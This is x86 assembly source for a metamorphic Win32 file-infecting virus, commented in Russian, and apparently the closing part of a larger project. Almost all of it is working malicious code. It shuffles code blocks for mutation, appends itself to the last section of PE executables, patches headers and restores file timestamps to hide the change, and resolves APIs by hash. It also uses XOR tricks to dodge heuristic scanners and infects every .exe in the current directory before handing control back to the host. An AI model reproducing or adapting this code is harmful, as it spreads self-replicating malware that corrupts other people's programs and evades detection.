;------------------------------------------------------------------------------------------------
	
	pop		esi;edi
	pop		esi                                         ;переходим к следующему адресу (следующему блоку)
	pop		ebx	
	add		esi,4
	cmp		word ptr [esi+4],0ffffh                     ;и так до предпоследнего адреса (т.к. мы его переставлять не будем)
	jne		_nxtaddr_

	mov		dword ptr [edi],ebx                        	;запишем последний маркер (хотя можно и без него:)!

;------------------------------------------------------------------------------------------------		
                                                        ;после того, как мы перемешали и записали все блоки, а также 
	                                          			;скорректировали все адреса в ТИ, то наша ТИ - тепепь наверняка не отсортирована   
	mov		edi,AddrShifrCode                           ;(а должна быть такой - об этом читай в spectr.asm). Здесь мы как раз ее и отсортируем 
	add		edi,CorVirSize                              ;в порядке возрастания.

	;push	edi
	;add		edi,SizeAddrIsklComand+5
	;lea		ecx,dword ptr [edi+SizeHashTable1]
	;CallFunc	ebx,ecx,dwEntry,'9'
	;pop		edi

fnSort:
	xor		eax,eax
	xor		ecx,ecx
_l1_:
	lea		ecx,[eax+1]
_l2_:
	mov		edx,[edi+ecx*8]
	cmp		[edi+eax*8],edx
	jbe		@F
	mov		ebx,[edi+eax*8]
	mov		[edi+eax*8],edx
	mov		[edi+ecx*8],ebx

	mov		ebx,[edi+eax*8+4]
	push	dword ptr [edi+ecx*8+4]
	pop		dword ptr [edi+eax*8+4]
	mov		[edi+ecx*8+4],ebx

@@:
	inc		ecx
	cmp		ecx,(SizeAddrIsklComand-2)/8;5
	jne		_l2_
	inc		eax
	cmp		eax,(SizeAddrIsklComand-2)/8-1;4
	jne		_l1_	        
;------------------------------------------------------------------------------------------------
	                                                    ;и еще один штрих - это сбалансируем стэк:)!
	pop		ebx
	sub		ebx,SizeAddrIsklComand
	mov		AddrShifrCode,ebx                           ;сохраним новый адрес
;xxxxxxxxxxxxxxxxxxxxxxxxxxxEND ПЕРЕСТАНОВКА БЛОКОВxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

	
	popad
;------------------------------------------------------------------------------------------------
	mov		edi,pExe;                        			;edi - mapped address
	push	edi
	mov		ecx,CorVirSize
	mov		ebx,FA										;ebx - FileAlignment
                                  						;теперь мы знаем FileAlignment
	dec		ebx                                         ;поэтому узнаем точный новый размер жертвы
	add		ecx,ebx                                     ;по той же формуле, что была написана выше(вначале этой функции в коментах)
	not		ebx
	and		ecx,ebx
	mov		ebx,wfdChgFileSize							;wfd.nFileSizeLow ;ebx - нормальный размер файла (до инфекта)
	add		ecx,ebx

	mov		wfdChgFileSize,ecx                 			;и сохраняем полученный размер                               
;------------------------------------------------------------------------------------------------
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxBEG оверлейxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
	
	lea		ecx,[eax+edx]                               ;ecx = PointerToRawData+SizeOfRawData
	cmp		ecx,ebx		                           		;проверяем, содержит ли файл оверлей
	jge		_noOverlay_
	sub		ecx,ebx                           			;если да, то перемещаем его в зад (так как некоторые файлы читают его именно с конца:)
	                                                    ;но не факт!
	neg		ecx
	lea		esi,[edi+ebx-1]
	add		edi,wfdChgFileSize
	dec		edi                
_repmovsbstd_:
	mov		bl,byte ptr [esi]
	mov		byte ptr [edi],bl
	dec		esi
	dec		edi
	dec		ecx
	jne		_repmovsbstd_
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxEND оверлейxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;------------------------------------------------------------------------------------------------
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxBEG INFECT!xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
_noOverlay_:
	pop		edi                         				;edi - mapped address
	add		edi,eax                                     ;переходим в конец файла(на диске:)!
	add		edi,edx
	mov		esi,AddrShifrCode                           ;esi - на начало нашего зверька                                 
	mov		ecx,CorVirSize                              ;размер полчившегося отмутированного нашего зверька:)!

	CallFunc	eax,ecx,dwEntry,'3'	  					;call	rep_movsb
														;и делаем свое суперское дело:)!
;------------------------------------------------------------------------------------------------
	
	mov		esi,tmpAddrTblIskl                          ;восстанавливаем ранее сохраненные 5 байт в буфер
	mov		edi,dwEntry
	add		edi,5+SizeHashTable1-4-5-SizeBat-4-20
	push	20
	pop		ecx

	CallFunc	eax,ecx,dwEntry,'3'	 					;call	rep_movsb

;------------------------------------------------------------------------------------------------			
	pushad
	push	MEM_DECOMMIT
	push 	SizeSPECTRCode
	push	tmpAddrTblIskl
	call	_fVirtualFree								;освобождаем выделенную память
	popad
;------------------------------------------------------------------------------------------------	


;------------------------------------------------------------------------------------------------

	mov		edi,pRSizeOfLastSec							;изменяем физический размер последней секции
	                                  					;SizeOfRawData=ALIGN_UP(SizeOfRawData+VirusSize,FileAlignment);
	mov		eax,dword ptr [edi]
	add		eax,CorVirSize               
	mov		ebx,FA
	dec		ebx
	add		eax,ebx
	not		ebx
	and		eax,ebx
	mov		dword ptr [edi],eax
;------------------------------------------------------------------------------------------------
	mov		esi,pVSizeOfLastSec							;изменяем виртуальный размер последней секции
	;=dword ptr $-4                                  	;if((VirualSize+VirusSize)>SizeOfRawData)
	mov		ecx,dword ptr [esi]                         ;	VirtualSize=VirtualSize+VirusSize;
	add		ecx,CorVirSize                              ;else
	cmp		eax,ecx                                     ;	VrtualSize=SizeOfRawData(уже измененный)
	jge		_nor_                                       ;
	mov		dword ptr [esi],ecx
	jmp		_na_
_nor_:              
	mov		dword ptr [esi],eax
_na_:	
	mov		eax,dword ptr [esi]
	;lodsd
;------------------------------------------------------------------------------------------------
	mov		edi,pSizeOfImage							;изменяем размер образа
	;=dword ptr $-4                                  	;SizeOfImage=VirtualSize+VirtualAddress

	mov		ebx,VirtAddr	                            
	                                                    ;VirtualSize - уже измененный (естесно последней секции)
	add		eax,ebx                                     ;VirtualAddress - последней секции
	mov		dword ptr [edi],eax
;------------------------------------------------------------------------------------------------
;------------------------------------------------------------------------------------------------
	mov		eax,pExe                         			;ставим метку инфекта
	mov		word ptr [eax+34h],'sr'
;------------------------------------------------------------------------------------------------	
_error_:
;------------------------------------------------------------------------------------------------
_unmap_:		
	pushad
	push	pExe;[pExe+ebp]                             ;освобождаем
	call	_fUnmapViewOfFile
	popad
;------------------------------------------------------------------------------------------------
_error2_:
	mov		edi,szPath                                  ;
;------------------------------------------------------------------------------------------------

	CallFunc	eax,ecx,dwEntry,'4'	 					;call	fnOpenFile
	                                                    ;открываем файл для чтения/записи                                  
	inc		eax
	je		_enx_
	dec		eax
	xchg	eax,esi
;------------------------------------------------------------------------------------------------	
	lea		eax,[ebp+4*2+14h]							;wfd.ftLastWriteTime ;восстанавливаем время (последней модификации)
	pushad
	push	eax
	push	ebx
	push	ebx
	push	esi
	call	_fSetFileTime
	popad
;------------------------------------------------------------------------------------------------
	mov		eax,wfdChgFileSize
	pushad
	push	FILE_BEGIN
	push	ebx
	push	eax
	push	esi
	call	_fSetFilePointer							;обрезаем файл до нужной длины
	popad

	pushad
	push	esi
	call	_fSetEndOfFile                            	;готово
	popad

	pushad
	push	esi
	call	_fCloseHandle                             	;закрываем хэндл
	popad
;------------------------------------------------------------------------------------------------
_enx_:
	pushad
	push	dword ptr [ebp+4*2]							;wfd.dwFileAttributes
	push	edi
	call	_fSetFileAttributesA                      	;восстанавливаем старые атрибуты
	popad

	mov		esi,dword ptr [ebp-4*26]
	mov		eax,dword ptr [ebp-4*25]                    ;and eax
	lea		esp,dword ptr [ebp-4*24]                    ;and stack
	ret                                                 ;выходим:)!

;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Конец функции InfectFiles
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
	




_isklvir3_:
db	'viri','3'
Sizeisklvir3	equ		$ - _isklvir3_	
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Функция rep_movsb
;аналог rep movsb (cld)
;вспомогательная функция
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
rep_movsb:
	mov		al,byte ptr [esi]
	mov		byte ptr [edi],al
	inc		esi
	inc		edi
	dec		ecx
	jne		rep_movsb
	ret	 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции rep_movsb
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx






_isklvir4_:
db	'viri','4'
Sizeisklvir4	equ		$ - _isklvir4_	
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Функция fnOpenFile
;Открытие файла на чтение-запись
;Вход:
;edi - путь (имя) к файлу
;ebx - ноль (0)
;Выход:
;еах - возвращенное значение
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
fnOpenFile:
	xor		ebx,ebx	
	push	ebx
	pushad
	push	ebx
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	ebx
	push	FILE_SHARE_READ+FILE_SHARE_WRITE
	push	GENERIC_READ+GENERIC_WRITE
	push	edi
	call	_fCreateFileA                               ;открываем снова жертву (данный файл)
_iskl3_:
	mov		dword ptr [esp+20h],eax
Sizeiskl3	equ		$ - _iskl3_
	popad	
	pop		eax	
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Конец функции fOpenFile
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx





_isklvir5_:
db	'viri','5'
Sizeisklvir5	equ		$ - _isklvir5_	
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Функция ValidPE
;Проверка правильности РЕ-файла
;Вход:
;eax - адрес в памяти
;Выход:
;если это РЕ-файл, то edx!=0, иначе edx=0.
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
ValidPE:
	push	ebx
	mov		bx,631Ah                        			;антиэвристка
	xor		bx,3957h
	mov		edx,0D625h
	xor		edx,9375h                                    ;'ZM'(MZ)
	cmp		word ptr [eax],bx
	jne 	_invalid0_
	mov		ebx,dword ptr [eax+3Ch]                     ;переходим к РЕ-заголовку
	cmp		ebx,200h
	jg		_invalid0_                                      
	cmp		word ptr [eax+ebx],dx                       ;'EP'(PE)
	je		_itispe_
_invalid0_:
	xor		edx,edx
_itispe_:
	pop		ebx
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Конец функции ValidPE
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx






_isklvir6_:
db	'viri','6'
Sizeisklvir6	equ		$ - _isklvir6_	
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Функция GetKernelSEH
;Поиск базы Kernel32.dll через SEH
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
GetKernelSEH:
	xor		edx,edx
	mov		esi,dword ptr fs:[edx]              		;в еах - указатель на структуру ERR
_searchk_:
	mov		eax,dword ptr [esi]
	add		esi,4
	;lodsd			                    				;последний элемент
	inc		eax                                         ;должен быть равен 0хffffffff
	je		_okhandler_                                 ;
	dec		eax
	xchg	esi,eax
	jmp		_searchk_
_okhandler_:
	mov		eax,dword ptr [esi]
	add		esi,4
	;lodsd		                            			;если пришли к последнему элементу
														;адрес обработчика
	xor		ax,ax                                       ;гранулярность выделения памяти
	push	06h
	pop		ecx                                         ;счетчик страниц
_next0_:

	CallFunc	edx,ecx,[esp+4],'5'	 					;call	ValidPE
														;проверка очередной страницы
	test	edx,edx
	je		_sub0_
	xchg	esi,eax			                        	;в esi - сидит наша база
	ret
_sub0_:
	sub		eax,10000h                      			;с учетом гранулярности
	dec		ecx
	jne		_next0_
	;loop	_next0_
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Конец функции GetKernelSEH
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx





_isklvir7_:
db	'viri','7'
Sizeisklvir7	equ		$ - _isklvir7_	
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Функция GetGetProcAddress
;Поиск адреса необходимой функции путем сравнения хэшей
;Вход:
;esi - база модуля(Kernel32.dll, User32.dll, etc)
;edi - дарес таблицы хэшей
;Выход: 
;в стеке нужные адреса апишек
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
GetGetProcAddress:
	assume	esi:ptr IMAGE_DOS_HEADER     				;esi - заголовок MZ
	mov		ebx,esi
	add		esi,[esi].e_lfanew
	add		esi,4
	add		esi,sizeof IMAGE_FILE_HEADER
	assume	esi:ptr IMAGE_OPTIONAL_HEADER            	;esi - опциональный заголовок
	mov		esi,[esi].DataDirectory[0].VirtualAddress
	add		esi,ebx
	assume	esi:ptr IMAGE_EXPORT_DIRECTORY              ;esi - структура IMAGE_EXPORT_DIRECTORY
	push	esi
	mov		esi,[esi].AddressOfNames
	add		esi,ebx                                     ;esi - массив имен функций
	push	esi
;------------------------------------------------------------------------------------------------
_BeginSearch_:  										;поиск адреса функции путем сравнения хешей:)
	xor		edx,edx                         			;в edx - храним индекс
_next1_:
    push	esi
    mov		esi,dword ptr [esi]
	add		esi,ebx
;------------------------------------------------------------------------------------------------
_CalcHash_:                                           	;считаем хеш от имени
	xor		eax,eax
	xor		ecx,ecx
_calc_:
	ror		eax,7
	xor		ecx,eax
	mov		al,byte ptr [esi]
	inc		esi
	test	al,al
	jne		_calc_
	cmp		ecx,dword ptr [edi]       			
	pop		esi
	je		_okhash_                                    ;если хеши совпали
	inc		edx                                         ;иначе увеличиваем edx
	mov		eax,dword ptr [esi]
	add		esi,4
	jmp		_next1_
_okhash_:
	mov		esi,dword ptr [ebp-4*2]
	assume	esi:ptr IMAGE_EXPORT_DIRECTORY
	push	esi
	mov		esi,[esi].AddressOfNameOrdinals             ;esi - массивслов с индексами
	add		esi,ebx                                     ;массив ординалов(16 бит)
	movzx	edx,word ptr [esi][edx*2]
	pop		esi
	sub		edx,[esi].nBase                             ;вычитаем начальный ординал
	inc		edx                                         ;так как начальный ординал начинаетсяс 1
	mov		esi,[esi].AddressOfFunctions
	add		esi,ebx                                     ;edi - массив адресов функций
	mov		edx,dword ptr [esi][edx*4]
	add		edx,ebx                                     ;в edx - адрес нужной функции
	push	edx                                         ;кладем адрес в стэк
	add		edi,4
	mov		esi,dword ptr [ebp-4*3]
	cmp		word ptr [edi],0ffffh                       ;все ли адреса найдены?
	jne		_BeginSearch_                               ;если нет, то ищем дальше
	push	dword ptr [ebp-4*1]                         ;иначе выходим:)!
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Конец функции GetGetProcAddress
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx	

	



	
_isklvir8_:
db	'viri','8'
Sizeisklvir8	equ		$ - _isklvir8_	
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;начало выполнения нашего кода!
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
_START_:
    ;mov		eax,VirusSize
    ;mov		eax,SizeMut1
    ;mov		ecx,SizeMut2
	pop		ebx                                         ;
	sub		esp,140h									;под WIN32_FIND_DATA
	push	ebx 										;ebx - start

	CallFunc	edx,ecx,ebx,'6'	 						;call	GetKernelSEH
														;вызываем функцию получения базы Kernel32.dll
	call	_delta0_                                    ;вычисляем дельта-смещение
_delta0_:
	sub		dword ptr [esp],offset _delta0_
	mov		ebp,esp                                     ;устанавливаем ebp=esp
	mov		edi,dwEntry

	;cmp		delta,0
	;je		_nodelta_
	;push	edi
	;lea		ecx,dword ptr [edi+SizeHashTable1]
	;CallFunc	ebx,ecx,dwEntry,'9'
	;pop		edi

;_nodelta_:	
	CallFunc	ebx,ecx,dwEntry,'7'	 					;call	GetGetProcAddress
	                                                    ;вызываем функцию получения адресов нужных апишек                           
;------------------------------------------------------------------------------------------------
	sub		dwEntry,5
	mov		eax,dwEntry
	sub		eax,SizeAddrIsklComand
	lea		ebx,dword ptr [esp-4]

	;mov		ecx,dwEntry
	;add		ecx,5+SizeHashTable1-4-5-SizeBat-4
	;mov		edx,dword ptr [edx]	


	pushad	
	push	ebx;esp
	push	PAGE_EXECUTE_READWRITE
	push    VirusSize;dword ptr [ecx]
	push    eax
	call	_fVirtualProtect                            ;делаем атрибы страницы(в которой расположен наш вирковый кож:)! PAGE_EXEUCUTE_READWRITE
	popad
;------------------------------------------------------------------------------------------------
	push	eax
	pushad
	call	@F
szUser32		db 'user32.dll',0
SizeszUser32	equ		$-szUser32

@@:	
	;pushz	"user32.dll"
	call	_fLoadLibraryA                              ;загружаем User32.dll
_iskl4_:
	mov		dword ptr [esp+20h],eax
Sizeiskl4	equ		$ - _iskl4_
	popad
	pop		eax	
;------------------------------------------------------------------------------------------------	
	push	eax
	pushad	
	call	@F
szMessageBoxA	db 'MessageBoxA',0
SizeszMessageBoxA	equ		$ - szMessageBoxA

@@:
	push	eax
	call	_fGetProcAddress                            ;получаем адрес апишки "MessageBoxA"
_iskl5_:
	mov		dword ptr [esp+20h],eax
Sizeiskl5	equ		$ - _iskl5_
	popad
	pop		eax
	
	push	eax                                         ;и сохраняем его в стэке
;------------------------------------------------------------------------------------------------
	lea		edi,[ebp+4*2+2ch]							;wfd.cFileName
	
	pushad
	push	edi
	push	MAX_PATH
	call	_fGetCurrentDirectoryA                      ;получаем текущую директорию
	popad
	
	push	edi
	xor		eax,eax
	dec		edi
_scas001_:
	inc		edi
	cmp		al,byte ptr [edi]
	jne		_scas001_
	mov		dword ptr [edi],'cool'                   	;антиэвристка
	mov		dword ptr [edi+4],'fire'                	;в финале образуется маска: "\*.exe"
	xor		dword ptr [edi],06414530h
	xor		dword ptr [edi+4],6669171dh
	pop		edi

;xxxxxxxxxxxxxxxxxxxxBEG Поиск и инфект файлов в текущей директорииxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
	lea		esi,[ebp+4*2]								;wfd	
	push	eax
	pushad	
	push	esi
	push	edi
	call	_fFindFirstFileA                            ;начало поиска
_iskl6_:                                                ;очередное исключение
	mov		dword ptr [esp+20h],eax
Sizeiskl6	equ		$ - _iskl6_
	popad
	pop		eax
	
	inc		eax
	test	eax,eax
	je		_exitfind_	
	dec		eax                                         ;если удачно, 
	push	eax;save hFindFile                          ;то сохраняем полученный хэндл
	                                                        
_findfile_:
	mov		eax,dwEntry
	add		eax,5
	add		eax,SizeHashTable1
	sub		eax,4
	push	dword ptr [eax] 							;сохраняем OEP(неактульно только для первого поколения - другие ок!)

	CallFunc	ebx,ecx,dwEntry,'2'	       				;call	InfectFiles
	                                                    ;вызываем функцию инфекта РЕ-файлов                                	
	pop		dword ptr [eax]                             ;восстанавливаем OEP
			
	push	eax
	pushad
	push	esi
	push	dword ptr [esp+28h]                    		;hFindFile
	call	_fFindNextFileA                             ;продолжаем поиск
_iskl7_:                                                ;очередной адрес-исключение
	mov		dword ptr [esp+20h],eax
Sizeiskl7	equ		$ - _iskl7_
	popad
	pop		eax
	
	test	eax,eax
	jne		_findfile_
;xxxxxxxxxxxxxxxxxxxxEND Поиск и инфект файлов в текущей директорииxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
	
_exitfind_:

	CallFunc	eax,ecx,dwEntry,'1'	 					;call	Play	
	                                                    ;"полезная нагрузка:)!" вызов мессаги                  						
	cmp		delta,0                                     ;смотрим - первое ли поколение?
	je		_firstgen_                                  ;если да, то на выход
;------------------------------------------------------------------------------------------------                         	
_final_:                                                ;
	mov		eax,dwEntry
	add		eax,SizeHashTable1+5-4
	mov		edi,dword ptr [eax]
	
	pushad
	lea		ecx,dword ptr [esp-4]
	push	ecx
	push	PAGE_EXECUTE_READWRITE
	push    1000h
	push    edi
	call	_fVirtualProtect                            ;изменяем атрибуты (чтобы можно было вместо jmp восстановить оригинальные 5 байт жертвы)
	popad
		
	lea		esp,[ebp+4*2+140h]                          ;выравниваем стэк
;------------------------------------------------------------------------------------------------
	push	edi
	sub		eax,5+SizeBat+4+20
	push	20
	pop		ecx
	xchg	eax,esi

	CallFunc	eax,ecx,dwEntry,'3'	 					;call	rep_movsb
	                                                    ;и затираем наш jmp 5 байтами жертвы
	                                                    ;короче говоря, воостанавливаем байты		                            	
	pop		edi

	mov		esp,[esp+8]
	sub		eax,eax
	pop		dword ptr fs:[eax]
	pop		eax
	jmp		edi                                         ;и передаем управление носителю(жертве:)!
;------------------------------------------------------------------------------------------------

_isklvir9_:
db	'viri','9'
Sizeisklvir9	equ		$ - _isklvir9_

comment #
Crypt:
	push	eax
	mov		eax,12345678h
_xor_:
	xor		dword ptr [edi],eax
	add		edi,4
	cmp		edi,ecx
	jb		_xor_
	pop		eax
	ret


_isklvir10_:
db	'viri','A'
Sizeisklvir10	equ		$ - _isklvir10_
        #

;------------------------------------------------------------------------------------------------
_end_:
VirusSize		equ ($-start+1000)                      ;размер нашего зверька:)! (+запас, т.к. наш уже отмутированный код будет больше)
SizeSPECTRCode	equ	10000h								;будем выделять память для метаморфа с запасом
;------------------------------------------------------------------------------------------------
	
;------------------------------------------------------------------------------------------------
_firstgen_:
	push	0
	call	ExitProcess                                 ;выход в ОС
end start
;------------------------------------------------------------------------------------------------
;Будь сильным - слабым всегда не везет!
